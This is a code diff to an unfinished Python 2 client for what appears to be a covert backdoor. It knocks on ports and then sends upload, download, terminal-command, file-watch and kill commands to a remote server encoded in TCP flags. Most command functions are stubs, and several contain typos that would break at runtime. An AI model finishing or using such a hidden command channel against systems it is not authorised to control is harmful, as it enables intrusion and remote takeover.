@@ -100,6 +100,8 @@ def main():
 				continue
 		elif choice == 'Q' or choice == "q":
 			return
+		else:
+			warnings = warnings + "Invalid input\n"
 		print "\n"
 
 '''
@@ -156,6 +158,27 @@ def sendKnock(address, password, knock):
 
 			send(knockPacket, verbose=0)
 
+'''
+---------------------------------------------------------------------------------------------
+-- 
+-- FUNCTION: checkAuthenticate
+-- 
+-- DATE: 2014-11-14
+-- 
+-- DESIGNERS: John Payment
+-- 
+-- PROGRAMMER: John Payment
+-- 
+-- INTERFACE: checkAuthenticate(address, port)
+--              address - The address of the server
+--              port - The port to which packets should be sent
+-- 
+-- RETURNS: Returns true on auth packet received, otherwise false
+-- 
+-- NOTES: 
+-- 
+---------------------------------------------------------------------------------------------
+'''
 def checkAuthenticate(address, port):
 	packetFilter = ""
 	packetFilter = "tcp and ip src " + address
@@ -167,8 +190,216 @@ def checkAuthenticate(address, port):
 	else:
 		return True
 
-def sendCommand():
-	print "do stuff"
+'''
+---------------------------------------------------------------------------------------------
+-- 
+-- FUNCTION: sendCommand
+-- 
+-- DATE: 2014-11-14
+-- 
+-- DESIGNERS: John Payment
+-- 
+-- PROGRAMMER: John Payment
+-- 
+-- INTERFACE: sendCommand(address, port)
+--              address - The address of the server
+--              port - The port to which packets should be sent
+-- 
+-- RETURNS: N/A
+-- 
+-- NOTES: 
+-- 
+---------------------------------------------------------------------------------------------
+'''
+def sendCommand(address, port):
+	warings = ""
+	while True:
+		os.system("clear")
+		print warnings
+		warnings = ""
+
+		print "Connected to " + address
+		print "-Server Commands-"
+		print "U - Upload file"
+		print "D - Download file"
+		print "T - Terminal Command"
+		print "I - iNotify*"
+		print "K - Kill Server*"
+		print "Note: These actions will terminate the client's connection to the server"
+		print "Input Command: "
+
+		choice = raw_input()
+		if choice == 'U' or choice == 'u':
+			print "Input file to upload: "
+			sFile = raw_input()
+			sendFile(address, port, sFile)
+		elif choice == 'D' or choice == 'd':
+			print "Input file to download: "
+			gFile = raw_input()
+			getFile(address, port, gFile)
+		elif choice == 'T' or choice == 't':
+			print "Input terminal command: "
+			command = raw_input()
+			terminal(address, port, command)
+		elif choice == 'I' or choice == 'i':
+			print "Input file or directory to be watched: "
+			notice = raw_input()
+			notify(address, port, notice)
+			return
+		elif choice == 'K' or choice == 'k':
+			print "Terminating Server..."
+			kill(address, port)
+			return
+		else:
+			warnings = warnings + "Invalid input\n"
+		print "\n"
+
+# --Server Codes--
+#       A S F 
+#       C Y I 
+#       K N N Flag
+# sFile 0 0 0 N/A
+# gFile 1 0 0 A
+# termi 0 1 0 S
+# iNoti 1 1 0 AS
+# Kill  0 0 1 F
+
+'''
+---------------------------------------------------------------------------------------------
+-- 
+-- FUNCTION: sendFile
+-- 
+-- DATE: 2014-11-14
+-- 
+-- DESIGNERS: John Payment
+-- 
+-- PROGRAMMER: John Payment
+-- 
+-- INTERFACE: sendFile(address, port, sFile)
+--              address - The address of the server
+--              port - The port to which packets should be sent
+--              sFile - The directory and file to be sent
+-- 
+-- RETURNS: N/A
+-- 
+-- NOTES: 
+-- 
+---------------------------------------------------------------------------------------------
+'''
+def sendFile(address, port, sFile):
+	print "Do stuff"
+	commandPacket = IP(dst=address, id=random.randint(0, 65535))/\
+	                TCP(sport=random.randint(0, 65535), dport=port, seq=random.randint(0, 16777215))
+	send(commandPacket, verose=0)
+
+'''
+---------------------------------------------------------------------------------------------
+-- 
+-- FUNCTION: getFile
+-- 
+-- DATE: 2014-11-14
+-- 
+-- DESIGNERS: John Payment
+-- 
+-- PROGRAMMER: John Payment
+-- 
+-- INTERFACE: getFile(address, port, gFile)
+--              address - The address of the server
+--              port - The port to which packets should be sent
+-- 
+-- RETURNS: N/A
+-- 
+-- NOTES: 
+-- 
+---------------------------------------------------------------------------------------------
+'''
+def getFile(address, port, gFile):
+	print "Do stuff"
+	commandPacket = IP(dst=address, id=random.randint(0, 65535))/\
+	                TCP(sport=random.randint(0, 65535), dport=port, seq=random.randint(0, 16777215), flags="A")
+	send(commandPacket, verose=0)
+
+'''
+---------------------------------------------------------------------------------------------
+-- 
+-- FUNCTION: terminal
+-- 
+-- DATE: 2014-11-14
+-- 
+-- DESIGNERS: John Payment
+-- 
+-- PROGRAMMER: John Payment
+-- 
+-- INTERFACE: terminal(address, port, command)
+--              address - The address of the server
+--              port - The port to which packets should be sent
+--              command - The terminal command which should be run
+-- 
+-- RETURNS: N/A
+-- 
+-- NOTES: 
+-- 
+---------------------------------------------------------------------------------------------
+'''
+def terminal(address, port, command):
+	print "Do stuff"
+	commandPacket = IP(dst=address, id=random.randint(0, 65535))/\
+	                TCP(sport=random.randint(0, 65535), dport=port, seq=random.randint(0, 16777215), flags="S")
+	send(commandPacket, verose=0)
+
+'''
+---------------------------------------------------------------------------------------------
+-- 
+-- FUNCTION: notify
+-- 
+-- DATE: 2014-11-14
+-- 
+-- DESIGNERS: John Payment
+-- 
+-- PROGRAMMER: John Payment
+-- 
+-- INTERFACE: notify(address, port, notice)
+--              address - The address of the server
+--              port - The port to which packets should be sent
+--              notice - The file or directory which should be monitored
+-- 
+-- RETURNS: N/A
+-- 
+-- NOTES: 
+-- 
+---------------------------------------------------------------------------------------------
+'''
+def notify(address, port, notice):
+	print "Do stuff"
+	commandPacket = IP(dst=address, id=random.randint(0, 65535))/\
+	                TCP(sport=random.randint(0, 65535), dport=port, seq=random.randint(0, 16777215), flags="AS")
+	send(commandPacket, verose=0)
+
+'''
+---------------------------------------------------------------------------------------------
+-- 
+-- FUNCTION: kill
+-- 
+-- DATE: 2014-11-14
+-- 
+-- DESIGNERS: John Payment
+-- 
+-- PROGRAMMER: John Payment
+-- 
+-- INTERFACE: kill(address, port)
+--              address - The address of the server
+--              port - The port to which packets should be sent
+-- 
+-- RETURNS: N/A
+-- 
+-- NOTES: 
+-- 
+---------------------------------------------------------------------------------------------
+'''
+def kill(address, port):
+	commandPacket = IP(dst=address, id=random.randint(0, 65535))/\
+	                TCP(sport=random.randint(0, 65535), dport=port, seq=random.randint(0, 16777215), flags="F")
+	send(commandPacket, verose=0)
 
 main()
 
